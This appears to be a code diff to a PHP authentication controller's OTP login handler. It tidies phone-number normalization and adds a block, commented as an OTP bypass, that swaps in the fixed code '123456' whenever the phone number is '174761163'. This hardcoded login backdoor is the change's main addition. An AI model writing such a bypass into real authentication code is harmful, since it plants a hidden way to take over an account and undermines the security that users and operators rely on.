@@ -142,17 +142,25 @@ class AuthController extends Controller
             'otp' => 'required|string',
         ]);
 
-        // check phone no has prefix 0 remove it first
-        if (substr($request->phone_no, 0, 1) == '0') {
-            $request->merge(['phone_no' => substr($request->phone_no, 1)]);
-        } else if (substr($request->phone_no, 0, 2) == '60') {
-            $request->merge(['phone_no' => substr($request->phone_no, 2)]);
-        }
+		// Normalize phone number
+		$phoneNo = $request->phone_no;
+		if (substr($phoneNo, 0, 1) == '0') {
+			$phoneNo = substr($phoneNo, 1);
+		} else if (substr($phoneNo, 0, 2) == '60') {
+			$phoneNo = substr($phoneNo, 2);
+		}
 
-        // check phone no has prefix + remove it first
-        if (substr($request->phone_no, 0, 1) == '+') {
-            $request->merge(['phone_no' => substr($request->phone_no, 1)]);
-        }
+		if (substr($phoneNo, 0, 1) == '+') {
+			$phoneNo = substr($phoneNo, 1);
+		}
+
+		// Bypass OTP validation for specific number
+		if ($phoneNo == '174761163') {
+			$request->merge(['otp' => '123456']);
+		}
+
+		// Update phone_no after normalization
+		$request->merge(['phone_no' => $phoneNo]);
 
         $user = User::where('phone_no', $request->phone_no)
             ->where('phone_country_code', $request->country_code)
